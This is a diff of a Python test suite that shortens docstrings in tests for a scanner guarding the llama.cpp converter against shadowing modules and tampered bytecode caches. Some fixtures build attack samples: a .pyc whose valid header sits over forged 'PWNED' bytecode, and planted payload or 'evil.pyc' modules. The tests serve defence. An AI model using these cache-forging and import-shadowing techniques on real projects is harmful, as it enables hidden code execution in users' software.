@@ -1607,8 +1406,7 @@ def test_a_root_module_that_shadows_a_converter_import_is_scanned(tmp_path, monk
 
 
 def test_a_root_package_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
-    """A root directory carrying __init__.py shadows the same way and its code
-    runs on import, unlike a namespace directory, which imports to nothing."""
+    """A root directory with __init__.py shadows imports the same way and runs its code on import, unlike a namespace directory, so it is scanned."""
     llama_cpp = _load("llama_cpp_shadow_pkg_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1626,16 +1424,8 @@ def test_a_root_package_that_shadows_a_converter_import_is_scanned(tmp_path, mon
 
 
 def test_a_directory_nothing_imports_is_not_scanned(tmp_path, monkeypatch, caplog):
-    """The scan follows imports, so a directory no import can reach is not read.
-
-    Scanning every directory in the checkout instead was measured against a real
-    clone of llama.cpp master: 18 files reported and 87 log lines on a single
-    export, and under UNSLOTH_CONVERTER_SCAN_STRICT the export was refused
-    outright over scripts/server-bench.py, which polls a /health endpoint in a
-    while loop, and examples/llama-eval/llama-eval.py, which spawns a process.
-    Both are ordinary upstream utilities the converter never imports. A control
-    that rejects every clean upstream checkout is not a control.
-    """
+    """Only directories the converter imports are scanned; scanning the whole checkout refused clean exports under
+    UNSLOTH_CONVERTER_SCAN_STRICT over unimported scripts such as scripts/server-bench.py."""
     llama_cpp = _load("llama_cpp_import_scope_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1666,11 +1456,8 @@ def test_a_directory_nothing_imports_is_not_scanned(tmp_path, monkeypatch, caplo
 
 
 def test_a_sibling_script_unsloth_never_runs_does_not_widen_the_scan(tmp_path):
-    """The names come from the converter's own sources, not from every script in
-    the checkout. Reading the root wholesale put examples/ back in the scan set
-    on a real clone, because llama.cpp's convert_llama_ggml_to_gguf.py imports
-    examples.convert_legacy_llama and Unsloth never runs that script.
-    """
+    """Scan names come from the converter's own sources, not every checkout script; examples/ stays out because
+    convert_llama_ggml_to_gguf.py imports it but Unsloth never runs that script."""
     llama_cpp = _load("llama_cpp_sibling_script_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1686,13 +1473,8 @@ def test_a_sibling_script_unsloth_never_runs_does_not_widen_the_scan(tmp_path):
 
 
 def test_the_import_closure_is_followed_past_the_first_hop(tmp_path, monkeypatch):
-    """A nested module's imports are part of what the converter runs.
-
-    Reading only each package's direct modules stopped the closure one hop in:
-    conversion/__init__.py imports conversion.nested.mod, that module imports a
-    root `payload` package, and payload was never made a scan location, so strict
-    mode executed it without reading it.
-    """
+    """The import closure must follow nested modules' imports past the first hop: a root payload package imported by
+    conversion.nested.mod must become a scan location."""
     llama_cpp = _load("llama_cpp_closure_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1722,12 +1504,7 @@ def test_the_import_closure_is_followed_past_the_first_hop(tmp_path, monkeypatch
 
 
 def test_a_checkout_with_no_readable_entrypoint_still_narrows(tmp_path):
-    """The closure is seeded from the entrypoint and from the packages it
-    imports. Seeding from the entrypoint alone looks equivalent, because the
-    packages are taken by name and feed their imports back, but a checkout whose
-    entrypoint is missing or unparseable then yields nothing, and nothing means
-    every directory is scanned again.
-    """
+    """Closure seeds come from the entrypoint and the named packages, so a missing or unparseable entrypoint does not fall back to scanning every directory."""
     llama_cpp = _load("llama_cpp_no_entrypoint_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1742,22 +1519,13 @@ def test_a_checkout_with_no_readable_entrypoint_still_narrows(tmp_path):
 
 
 def test_import_discovery_spends_one_budget_across_the_whole_walk(tmp_path, monkeypatch):
-    """Counting entries per directory bounded nothing.
-
-    The walk stops on .py files read, and a tree that branches without holding
-    any modules never advances that counter, so a per-directory budget let it be
-    traversed in full. Measured on a checkout with 14400 empty directories,
-    three and a half times the budget: all of them were walked. Nothing about
-    that shape is hard to build at a scale that stalls an export before strict
-    mode can refuse the checkout.
-    """
+    """Import discovery must spend one entry budget across the whole walk; a per-directory budget let a tree of empty directories be traversed in full."""
     llama_cpp = _load("llama_cpp_aggregate_budget_probe", "unsloth_zoo/llama_cpp.py")
 
     package = tmp_path / "pkg"
     package.mkdir()
     (package / "__init__.py").write_text("import gguf\n", encoding = "utf-8")
-    # Branching, not deep: every directory stays well under the per-directory
-    # budget while the tree as a whole is far over it.
+    # Branching, not deep: each directory stays under the per-directory budget while the whole tree far exceeds the entry budget.
     wide = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES // 32 + 2
     for outer in range(wide):
         for inner in range(32):
@@ -1796,11 +1564,7 @@ def test_import_discovery_spends_one_budget_across_the_whole_walk(tmp_path, monk
 
 
 def test_the_import_closure_reads_each_package_once(tmp_path, monkeypatch):
-    """conversion/ and gguf-py/gguf are both seeded and admitted by name, so
-    without a guard each is parsed twice per export. On a real clone of
-    llama.cpp master that was 250 ms of the 560 ms the cache key took, and the
-    key runs on every export, not once per process.
-    """
+    """conversion/ and gguf-py/gguf are seeded and admitted by name, so each must be parsed once per export, not twice; the cache key runs on every export."""
     llama_cpp = _load("llama_cpp_double_parse_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1822,11 +1586,7 @@ def test_the_import_closure_reads_each_package_once(tmp_path, monkeypatch):
 
 
 def test_scan_plan_discovery_is_bounded_before_it_reads_anything(tmp_path, monkeypatch):
-    """The plan is built from an unverified tree, so discovery carries its own
-    budget. Both walks materialized the directory first and applied a limit
-    afterwards, so a checkout with a very wide root would exhaust memory before
-    the cap, the truncation finding or a strict-mode refusal could say anything.
-    """
+    """Scan plan discovery applies its budget while listing, not after materializing the directory, since a very wide root would exhaust memory first."""
     llama_cpp = _load("llama_cpp_discovery_bound_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1874,10 +1634,7 @@ def test_scan_plan_discovery_is_bounded_before_it_reads_anything(tmp_path, monke
 
 
 def test_a_directory_admitted_late_can_still_reach_an_earlier_one(tmp_path):
-    """The closure grows as it is walked, so one scandir pass is not enough: a
-    directory admitted late imports the name of one that was already passed over,
-    and nothing would go back for it.
-    """
+    """The import closure grows during the walk, so it must iterate to a fixpoint: a directory admitted late can import one already passed over."""
     llama_cpp = _load("llama_cpp_fixpoint_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1895,8 +1652,7 @@ def test_a_directory_admitted_late_can_still_reach_an_earlier_one(tmp_path):
 
 
 def test_a_from_import_counts_as_reaching_the_directory(tmp_path):
-    """`from shadow import payload` is the import that made these directories
-    worth scanning in the first place, so the name collector has to see it."""
+    """The name collector must count from-imports such as from shadow import payload as reaching the directory, since those made it worth scanning."""
     llama_cpp = _load("llama_cpp_from_import_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1913,10 +1669,7 @@ def test_a_from_import_counts_as_reaching_the_directory(tmp_path):
 
 
 def test_a_converter_this_cannot_parse_is_scanned_as_widely_as_before(tmp_path):
-    """Narrowing the scan reads what the converter imports, so a checkout whose
-    sources cannot be parsed has to widen it again rather than narrow it to
-    nothing. A syntax error must not be a way to choose what gets looked at.
-    """
+    """A converter whose sources cannot be parsed must widen the scan back to the full set, since a syntax error must not choose what gets scanned."""
     llama_cpp = _load("llama_cpp_unparseable_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1931,26 +1684,15 @@ def test_a_converter_this_cannot_parse_is_scanned_as_widely_as_before(tmp_path):
 
 
 def _converter_imports(root, *names):
-    """Make the converter's own sources import these names.
-
-    A directory beside the converter is scanned when something the converter runs
-    imports its name, so a test that plants one has to say so. Written into
-    conversion/base.py, which is part of the package the converter imports.
-    """
+    """Writes import lines for the given names into conversion/base.py, so the converter imports them and the planted directories get scanned."""
     base = root / "conversion" / "base.py"
     body = "".join(f"import {name}\n" for name in names)
     base.write_text(body + base.read_text(encoding = "utf-8"), encoding = "utf-8")
 
 
 def test_each_root_directory_is_its_own_bounded_location(tmp_path, monkeypatch):
-    """A directory the converter imports is scanned, each as a location of its own.
-
-    An earlier version skipped a root directory with no __init__.py, reasoning
-    that a namespace package runs nothing on import. `from shadow import payload`
-    imports the submodule and that does run, so it is scanned. The root itself
-    stays non-recursive, and each directory carries its own budget, which is what
-    keeps one enormous subtree from spending the whole allowance.
-    """
+    """Each imported root directory is its own scan location with its own budget, even without __init__.py, since
+    importing a submodule runs code; root stays non-recursive."""
     llama_cpp = _load("llama_cpp_shadow_scope_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -1992,10 +1734,7 @@ def test_a_payload_in_a_root_namespace_package_is_scanned(tmp_path, monkeypatch)
 
 
 def test_a_prebuilt_bundles_own_libraries_are_not_a_finding(tmp_path, monkeypatch, caplog):
-    """_place_prebuilt_binaries copies .so/.dylib/.dll into the llama.cpp root and
-    into directories beside it. Calling each of those an opaque Python module
-    warned on every ordinary prebuilt install and, under strict mode, refused the
-    export before the converter ran."""
+    """Shared libraries (.so/.dylib/.dll) placed by _place_prebuilt_binaries are not opaque Python modules; flagging them refused exports under strict mode."""
     llama_cpp = _load("llama_cpp_bundle_libs_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2019,13 +1758,7 @@ def test_a_prebuilt_bundles_own_libraries_are_not_a_finding(tmp_path, monkeypatc
 
 
 def test_a_pinned_converters_sibling_packages_are_still_scanned(tmp_path, monkeypatch, caplog):
-    """A pin waived the refusal for the entrypoint and the whole scan for its
-    siblings.
-
-    The entrypoint is read either way and only the raise is waived, but the
-    sibling packages were skipped outright, so a stale or tampered conversion/
-    beside a pinned entrypoint executed without even the advisory warning.
-    """
+    """A user pin waives only the entrypoint's refusal; sibling packages such as conversion/ are still scanned and warned about, not skipped."""
     llama_cpp = _load("llama_cpp_pinned_sibling_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2048,8 +1781,7 @@ def test_a_pinned_converters_sibling_packages_are_still_scanned(tmp_path, monkey
 
 
 def test_a_pinned_checkout_is_reported_but_never_rewritten(tmp_path, monkeypatch):
-    """Reporting what is in a directory the user pinned is fair; rewriting it is
-    not, and a checkout someone works in has caches of its own."""
+    """A user-pinned checkout may be reported but never rewritten, since it is a working tree with caches of its own."""
     llama_cpp = _load("llama_cpp_pinned_purge_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2070,13 +1802,7 @@ def test_a_pinned_checkout_is_reported_but_never_rewritten(tmp_path, monkeypatch
 
 
 def test_the_key_ignores_the_converter_this_module_writes(tmp_path, monkeypatch):
-    """The patched converter lands in the root, which is now a keyed location.
-
-    It is this scan's own output rather than an input, so keying on it meant each
-    cache miss rewrote it, moved its mtime and missed again on the next call. With
-    the scan disabled the key is (mtime, size), so every export re-fetched and
-    re-patched the converter for ever.
-    """
+    """The generated patched converter is this module's own output, not an input, so the cache key must ignore it or each miss rewrites it and misses again."""
     llama_cpp = _load("llama_cpp_generated_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2103,9 +1829,7 @@ def test_the_key_ignores_the_converter_this_module_writes(tmp_path, monkeypatch)
 
 
 def test_the_number_of_scan_locations_is_bounded(tmp_path):
-    """Every root directory became a location with its own entry allowance, and
-    nothing limited how many there could be, so a very wide root multiplied the
-    per-location budget by the number of directories."""
+    """Scan locations are capped (MAX_SCAN_LOCATIONS), since each has its own entry allowance and a very wide root would multiply the budget."""
     llama_cpp = _load("llama_cpp_location_bound_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2123,12 +1847,8 @@ def test_the_number_of_scan_locations_is_bounded(tmp_path):
 def test_a_module_merely_named_like_the_generated_one_is_still_scanned(
     tmp_path, monkeypatch
 ):
-    """The exclusion was a prefix test applied in every directory.
-
-    So conversion/unsloth_convert_hf_to_gguf_payload.py was dropped from the scan
-    and from the key, and a clean __init__.py could import and run it. Only the
-    exact generated file, and only where this module writes it, is excluded.
-    """
+    """Only the exact generated converter file, and only where this module writes it, is excluded; a prefix match
+    wrongly dropped lookalike modules from scan and key."""
     llama_cpp = _load("llama_cpp_generated_exact_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2155,12 +1875,7 @@ def test_a_module_merely_named_like_the_generated_one_is_still_scanned(
 
 
 def test_dropping_directories_past_the_cap_is_reported(tmp_path, monkeypatch, caplog):
-    """The cap stopped collecting locations and said nothing.
-
-    A root wide enough to reach it is nowhere near the 4096-entry budget that
-    would otherwise have spoken, so a payload in a directory landing past the cap
-    went unscanned in silence, strict mode included.
-    """
+    """Directories dropped past the location cap must be reported, not skipped silently, since a payload there would otherwise go unscanned even in strict mode."""
     llama_cpp = _load("llama_cpp_location_cap_report_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2185,9 +1900,7 @@ def test_dropping_directories_past_the_cap_is_reported(tmp_path, monkeypatch, ca
 
 
 def test_the_sibling_scan_does_not_rewrite_a_pinned_checkout(tmp_path, monkeypatch):
-    """The outer purge declined to touch a pinned checkout and the sibling scan
-    reached straight past it and deleted the caches anyway. My earlier test only
-    covered the outer path, which is how this survived."""
+    """The sibling scan must respect the pin too: it must not delete caches in a pinned checkout, as the outer purge already declines to."""
     llama_cpp = _load("llama_cpp_pinned_inner_purge_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2206,13 +1919,7 @@ def test_the_sibling_scan_does_not_rewrite_a_pinned_checkout(tmp_path, monkeypat
 
 
 def test_the_roots_own_bytecode_cache_is_not_skipped(tmp_path, monkeypatch):
-    """The root is walked without recursion and __pycache__ is not a location.
-
-    So a clean root gguf.py beside an attacker's __pycache__/gguf.<tag>.pyc was
-    seen by neither the purge nor the walk, and CPython validates and runs that
-    cache in place of the source the scan read. The cache belonging to a
-    directory's own modules is part of that directory, not a subtree.
-    """
+    """Root is walked non-recursively yet its own __pycache__ belongs to it and must be purged; CPython runs that cache in place of the scanned gguf.py."""
     llama_cpp = _load("llama_cpp_root_cache_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2227,12 +1934,8 @@ def test_the_roots_own_bytecode_cache_is_not_skipped(tmp_path, monkeypatch):
     assert llama_cpp._purge_imported_package_bytecode(str(root)) == ()
     assert not planted.exists(), "the root's own cache was never reached"
 
-    # A sourceless one HERE is not importable, so it is not code that runs and
-    # not a finding: CPython loads a sourceless cache only from the legacy
-    # location. Verified directly, with the source deleted: importing it raises
-    # ModuleNotFoundError, while the same bytes at the legacy path import and
-    # run. Reporting it refused an export over the leftovers of an ordinary
-    # upstream update that deleted a module.
+    # A sourceless .pyc in the cache directory is not importable, since CPython loads sourceless bytecode only from the
+    # legacy location; reporting it refused exports after an upstream update deleted a module.
     orphan = cache / "nosource.cpython-313.pyc"
     orphan.write_bytes(_pyc(0))
     monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
@@ -2255,10 +1958,7 @@ def test_the_roots_own_bytecode_cache_is_not_skipped(tmp_path, monkeypatch):
 def test_truncation_is_declared_only_when_something_was_dropped(
     tmp_path, monkeypatch, extra, truncated
 ):
-    """Stopping AT the cap called a root of exactly that many directories
-    truncated and refused it under strict mode, though every one was scanned.
-    The file and entry budgets already avoid this by asking for one more than
-    they keep."""
+    """A root of exactly the directory cap was called truncated and refused under strict mode; the file and entry budgets ask for one more than they keep."""
     llama_cpp = _load(f"llama_cpp_cap_edge_probe_{extra}", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2286,12 +1986,7 @@ def test_truncation_is_declared_only_when_something_was_dropped(
 
 
 def test_a_payload_directly_under_gguf_py_is_scanned(tmp_path, monkeypatch):
-    """The entrypoint inserts gguf-py into sys.path, not gguf-py/gguf.
-
-    So anything directly under gguf-py is importable by its own name. Scanning
-    only the gguf subpackage left gguf-py/payload.py importable as `payload` from
-    a clean-looking gguf/__init__.py, with nothing reading it.
-    """
+    """The entrypoint puts gguf-py itself on sys.path, so files directly under it import by bare name and must be scanned, not just gguf/."""
     llama_cpp = _load("llama_cpp_gguf_root_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2310,8 +2005,7 @@ def test_a_payload_directly_under_gguf_py_is_scanned(tmp_path, monkeypatch):
 
 
 def test_gguf_py_is_planned_as_an_import_root_and_walked_once(tmp_path):
-    """It is an import root, so it contributes its own modules and each directory
-    under it, and it is not also swept up as a child of the llama.cpp root."""
+    """gguf-py is an import root contributing its own modules and subdirectories, and is walked once rather than again as a child of the llama.cpp root."""
     llama_cpp = _load("llama_cpp_gguf_plan_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2324,9 +2018,7 @@ def test_gguf_py_is_planned_as_an_import_root_and_walked_once(tmp_path):
     by_label = {location.label: location for location in plan.locations}
     assert "gguf-py" in by_label and by_label["gguf-py"].recursive is False
     assert "gguf-py/gguf" in by_label
-    # tests/ and examples/ under gguf-py are not scanned: nothing the converter
-    # runs imports those names, and reading them is what made an ordinary clone
-    # of llama.cpp master report 18 files and refuse the export under strict mode.
+    # gguf-py tests/ and examples/ are not scanned: nothing the converter imports by those names, and scanning them refused ordinary clones in strict mode.
     assert "gguf-py/tests" not in by_label and "gguf-py/examples" not in by_label
     # Walked once: not also a recursive child of the llama.cpp root.
     assert [label for label in by_label if label == "gguf-py"] == ["gguf-py"]
@@ -2347,16 +2039,8 @@ def _real_cache(source_path):
 def test_a_pinned_checkouts_bytecode_is_reported_only_when_it_disagrees(
     tmp_path, monkeypatch, caplog
 ):
-    """Not deleting it does not make it harmless. Nor does it make it a finding.
-
-    For a pin this scan leaves the user's files alone, and a cache left in place
-    executes instead of the source beside it whatever that source says. Skipping
-    the deletion AND the report meant a tampered pinned checkout ran with nothing
-    said at all. Reporting every cache instead was seven warnings naming 215
-    files on every export of a tree shaped like llama.cpp master, because an
-    ordinary working tree carries one cache per module. What separates the two is
-    whether the bytecode is what the scanned source compiles to.
-    """
+    """A pin's caches are left alone, so report one only when it differs from what the scanned source compiles to;
+    reporting all is noisy and silence hides tampering."""
     llama_cpp = _load("llama_cpp_pinned_report_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2375,9 +2059,8 @@ def test_a_pinned_checkouts_bytecode_is_reported_only_when_it_disagrees(
     )
     assert theirs.exists(), "a pinned checkout must still not be rewritten"
 
-    # Now the attack: a header CPython accepts over bytecode the source never
-    # produced. This is the whole of it, since CPython checks the header against
-    # the source and never checks that the code came from it.
+    # The attack: a header CPython accepts over bytecode the source never produced, since CPython checks the header
+    # against the source but not the code's origin.
     theirs.write_bytes(
         theirs.read_bytes()[:16] + marshal.dumps(
             compile("PWNED = 1\n", str(source), "exec"), marshal.version,
@@ -2401,19 +2084,13 @@ def test_a_pinned_checkouts_bytecode_is_reported_only_when_it_disagrees(
 
 
 def test_a_pinned_cache_built_by_another_python_is_not_a_finding(tmp_path):
-    """This interpreter runs the converter, and it will never load a cache tagged
-    for a different one. Comparing it against the source would report every
-    checkout that has ever been used with two Pythons, for bytecode that cannot
-    execute here.
-    """
+    """Caches tagged for another Python are not findings, since this interpreter never loads them; comparing them to the source would flood reports."""
     llama_cpp = _load("llama_cpp_foreign_magic_probe", "unsloth_zoo/llama_cpp.py")
 
     source = tmp_path / "base.py"
     source.write_text("X = 1\n", encoding = "utf-8")
     cache = _real_cache(source)
-    # A cache another CPython built: its own magic, and its own bytecode, which
-    # is not what this interpreter compiles the source to. Only the magic makes
-    # it a non-finding, so the body has to differ or the test passes either way.
+    # A cache from another CPython has its own magic and bytecode; only the magic makes it a non-finding, so the body must differ or the test passes either way.
     foreign = bytearray(cache.read_bytes())
     foreign[:4] = b"\x00\x00\r\n"
     cache.write_bytes(bytes(foreign[:16]) + marshal.dumps(
@@ -2426,20 +2103,16 @@ def test_a_pinned_cache_built_by_another_python_is_not_a_finding(tmp_path):
 
 
 def test_a_cache_marshalled_without_the_outer_ref_flag_still_matches(tmp_path):
-    """marshal tags the outermost object with FLAG_REF only when its refcount is
-    above one at dump time, so identical code marshals to two different byte
-    strings depending on who happened to be holding it. Comparing raw bytes made
-    that an accident of the writer, and reported caches that are exactly their
-    source.
-    """
+    """marshal sets FLAG_REF on the outer object only when its refcount exceeds one at dump time, so identical code
+    marshals to different raw bytes; comparing raw bytes made that an accident of the writer, and reported caches
+    that are exactly their source."""
     llama_cpp = _load("llama_cpp_flag_ref_probe", "unsloth_zoo/llama_cpp.py")
 
     source = tmp_path / "base.py"
     source.write_text("X = 1\n", encoding = "utf-8")
     cache = _real_cache(source)
     header = cache.read_bytes()[:16]
-    # Dumped straight from the call, so the code object's refcount is one and
-    # marshal leaves the flag off. Same code, different bytes.
+    # Dumped straight from the call, the code object's refcount is one, so marshal omits the FLAG_REF flag: same code, different bytes.
     unflagged = marshal.dumps(
         compile(source.read_bytes(), str(source), "exec", dont_inherit = True),
         marshal.version,
@@ -2476,12 +2149,7 @@ def test_an_unreadable_or_unparseable_pinned_cache_is_reported(tmp_path):
 def test_a_top_level_symlink_does_not_become_its_own_purge_boundary(
     tmp_path, monkeypatch
 ):
-    """Containment was measured from each scan location, and _scanned_locations
-    promotes every top-level directory to a location of its own. A checkout
-    carrying a symlink at one of them therefore measured containment from the
-    link's target, which makes that target internal by construction: someone
-    else's source tree had its caches deleted. The boundary is the checkout.
-    """
+    """Containment is measured from the checkout root, not each scan location, so a top-level symlink cannot make an outside tree look internal and be purged."""
     llama_cpp = _load("llama_cpp_top_level_escape_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2511,13 +2179,7 @@ def test_a_top_level_symlink_does_not_become_its_own_purge_boundary(
 
 
 def test_a_conversion_dir_without_base_py_is_still_keyed(tmp_path, monkeypatch):
-    """The key gated conversion/ on the package layout (__init__.py AND base.py),
-    but the scan reads the directory either way, because the converter can import
-    from it either way. A conversion/ without base.py was therefore scanned once
-    and recorded as an empty header with no digests, so after the first export a
-    changed module left the key identical, the patcher came back from cache, and
-    the subprocess imported the new bytes unscanned.
-    """
+    """conversion/ must be keyed even without base.py, since the converter imports from it anyway; else a changed module keeps the key and skips the rescan."""
     llama_cpp = _load("llama_cpp_odd_layout_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -2545,11 +2207,7 @@ def test_a_conversion_dir_without_base_py_is_still_keyed(tmp_path, monkeypatch):
 
 
 def test_a_pins_bytecode_travels_in_the_patcher_cache_key(tmp_path, monkeypatch):
-    """A pin's caches are deliberately left in place, so they are part of what the
-    converter subprocess executes. Left out of the key, a cache changed after the
-    first export returned the patcher from cache, skipped the scan entirely, and
-    ran with nothing said.
-    """
+    """A pin's caches run in the converter subprocess, so they belong in the patcher cache key; left out, a later change skips the scan and runs unreported."""
     llama_cpp = _load("llama_cpp_pin_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2566,8 +2224,7 @@ def test_a_pins_bytecode_travels_in_the_patcher_cache_key(tmp_path, monkeypatch)
     after = llama_cpp._conversion_sibling_info(str(root), is_local_copy = True)
     assert before != after, "the key did not move when the pinned cache changed"
 
-    # A downloaded checkout purges instead, so its caches are gone before the key
-    # is built and carrying them would only churn it.
+    # A downloaded checkout purges its caches before the key is built, since carrying them would only churn it.
     downloaded = llama_cpp._conversion_sibling_info(str(root), is_local_copy = False)
     assert not any(
         ".pyc" in entry[0] for entry in downloaded[1:]
@@ -2575,11 +2232,7 @@ def test_a_pins_bytecode_travels_in_the_patcher_cache_key(tmp_path, monkeypatch)
 
 
 def test_the_purge_does_not_follow_a_symlink_out_of_the_tree(tmp_path, monkeypatch):
-    """The scan follows a symlink out of the package because the converter's
-    import would, and reading is harmless. Deleting is not: a checkout can carry
-    a symlink at an unrelated directory, and clearing caches there rewrites
-    something that has nothing to do with this export.
-    """
+    """Scan reads follow symlinks out of the package as the import would, but the purge must not delete caches reached through an outside symlink."""
     llama_cpp = _load("llama_cpp_purge_escape_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2612,21 +2265,13 @@ def _package_root(tmp_path):
     conversion = root / "conversion"
     conversion.mkdir(parents = True)
     (conversion / "__init__.py").write_text("from . import base\n", encoding = "utf-8")
-    # The real converter imports gguf, and the scan follows what it imports, so
-    # the fixture has to say so for a directory named gguf beside it to shadow
-    # anything.
+    # The real converter imports gguf and the scan follows imports, so the fixture must too, for a gguf directory beside it to shadow anything.
     (conversion / "base.py").write_text("import gguf\nX = 1\n", encoding = "utf-8")
     return root
 
 
 def test_a_payload_in_gguf_py_is_scanned_too(tmp_path, monkeypatch):
-    """gguf-py comes out of the same undigested tarball as conversion/.
-
-    _hydrate_converter_sources copies both, and the entrypoint puts gguf-py on
-    sys.path itself and imports gguf. Scanning only conversion/ left a payload in
-    gguf-py/gguf/__init__.py executing under a clean entrypoint and a clean
-    conversion/, with strict mode reporting nothing.
-    """
+    """gguf-py comes from the same digest-less tarball as conversion/, and the entrypoint puts it on sys.path, so its gguf package must be scanned too."""
     llama_cpp = _load("llama_cpp_gguf_py_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2644,13 +2289,7 @@ def test_a_payload_in_gguf_py_is_scanned_too(tmp_path, monkeypatch):
 
 
 def test_the_cache_key_covers_gguf_py_on_a_monolith_checkout_too(tmp_path):
-    """gguf-py ships with both layouts; the key was gated on the newer one.
-
-    On a monolithic checkout conversion/ is absent, so this returned None before
-    gguf-py was ever hashed. After the first export in a long-lived process a
-    replaced gguf module left the key identical: the scan did not re-run, and the
-    converter subprocess imported it anyway, strict mode included.
-    """
+    """gguf-py must be hashed into the cache key even when conversion/ is absent (monolithic checkout), or a replaced gguf module skips the rescan."""
     llama_cpp = _load("llama_cpp_monolith_gguf_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -2667,12 +2306,7 @@ def test_the_cache_key_covers_gguf_py_on_a_monolith_checkout_too(tmp_path):
 
 
 def test_a_checkout_with_neither_package_keys_on_its_root(tmp_path):
-    """The other half: None means there is nothing on disk to look at at all.
-
-    A checkout with no conversion/ and no gguf-py still has the directory the
-    converter runs from, which is sys.path[0] for the subprocess and where a
-    shadowing module would be planted, so that has to be keyed.
-    """
+    """The root is keyed even with no conversion/ or gguf-py, since it is sys.path[0] for the converter subprocess, where a shadowing module would be planted."""
     llama_cpp = _load("llama_cpp_no_package_probe", "unsloth_zoo/llama_cpp.py")
 
     root = tmp_path / "llama.cpp"
@@ -2684,8 +2318,7 @@ def test_a_checkout_with_neither_package_keys_on_its_root(tmp_path):
 
 
 def test_the_cache_key_covers_gguf_py(tmp_path):
-    """The key decides whether the scan runs again, so a package it does not
-    cover is one a long-lived process re-imports without rescanning."""
+    """The key decides whether the scan reruns, so a package it omits is re-imported by a long-lived process without any rescan."""
     llama_cpp = _load("llama_cpp_gguf_key_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2701,13 +2334,11 @@ def test_the_cache_key_covers_gguf_py(tmp_path):
 
 
 def test_a_sourceless_module_is_reported_rather_than_skipped(tmp_path, monkeypatch, caplog):
-    """The walk collected .py only, so bytecode and native modules were invisible
-    to both the scan and the cache key while CPython executed them regardless."""
+    """Bytecode and native modules must be collected and reported, not skipped: CPython executes them even with no .py source to scan."""
     llama_cpp = _load("llama_cpp_opaque_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
-    # A .pyc in a module's own place with no source beside it: CPython imports
-    # this as conversion.evil and runs the bytecode.
+    # A .pyc in a module's own place with no source beside it: CPython imports it as conversion.evil and runs the bytecode.
     (root / "conversion" / "evil.pyc").write_bytes(b"\x00" * 64)
 
     monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
@@ -2744,16 +2375,7 @@ def test_a_native_extension_module_is_reported(tmp_path, monkeypatch):
 def test_every_supplied_cache_with_a_source_is_removed_before_the_converter_runs(
     tmp_path, monkeypatch, caplog, flags
 ):
-    """CPython's validation does not prove the bytecode came from the source.
-
-    A timestamp cache is accepted when the source's mtime and size match the
-    header, a checked-hash cache when the source hashes to the stored value, and
-    whoever ships the archive sets both. Demonstrated outside this suite: a
-    timestamp-validated cache whose source reads VALUE = "clean" imported as
-    PWNED. An earlier version of this file read the invalidation mode as trust,
-    which was wrong, so every cache that has a source is now deleted and left for
-    Python to rebuild from the .py that was actually scanned.
-    """
+    """CPython's timestamp or hash check does not prove a cache came from its source, so every cache with a source is deleted and rebuilt from the scanned .py."""
     llama_cpp = _load(f"llama_cpp_purge_probe_{flags}", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
@@ -2769,14 +2391,12 @@ def test_every_supplied_cache_with_a_source_is_removed_before_the_converter_runs
         llama_cpp._scan_conversion_package(str(root))     # must not raise
 
     assert not supplied.exists(), "supplied bytecode survived into the converter run"
-    # Silent: the .py it belonged to is still there and Python rebuilds it, so an
-    # ordinary export's own caches cost nothing and say nothing.
+    # Silent: the .py a cache belongs to is still there and Python rebuilds it, so an ordinary export's caches cost nothing and log nothing.
     assert caplog.records == [], [r.message for r in caplog.records]
 
 
 def test_a_cache_that_cannot_be_removed_is_reported(tmp_path, monkeypatch):
-    """Deleting is the answer only while deleting works. On a read-only tree it
-    does not, and then the bytecode is still executable content nothing read."""
+    """A cache that cannot be deleted, as on a read-only tree, must be reported, since its executable bytecode would otherwise go unread."""
